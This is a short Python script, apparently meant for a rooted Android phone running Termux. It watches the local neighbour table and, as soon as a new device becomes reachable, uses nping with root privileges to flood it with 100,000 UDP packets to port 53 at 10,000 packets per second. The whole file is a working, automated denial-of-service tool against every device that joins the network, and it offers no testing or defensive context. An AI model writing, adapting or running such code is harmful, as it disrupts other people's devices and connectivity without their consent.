import subprocess
import time

def get_connected_ips():
    result = subprocess.run(['ip', 'neigh'], capture_output=True, text=True)
    lines = result.stdout.strip().split('\n')
    ips = [line.split()[0] for line in lines if 'REACHABLE' in line]
    return ips

def flood_target(ip):
    print(f"Starting flood on {ip}")
    subprocess.Popen([
        'su', '-c',
        f'/data/data/com.termux/files/usr/bin/nping --udp -p 53 --rate 10000 -c 100000 {ip}'
    ])


def monitor_and_attack():
    known_ips = set()
    while True:
        current_ips = set(get_connected_ips())
        new_ips = current_ips - known_ips
        for ip in new_ips:
            flood_target(ip)
        known_ips = current_ips
        time.sleep(5)

if __name__ == "__main__":
    monitor_and_attack()
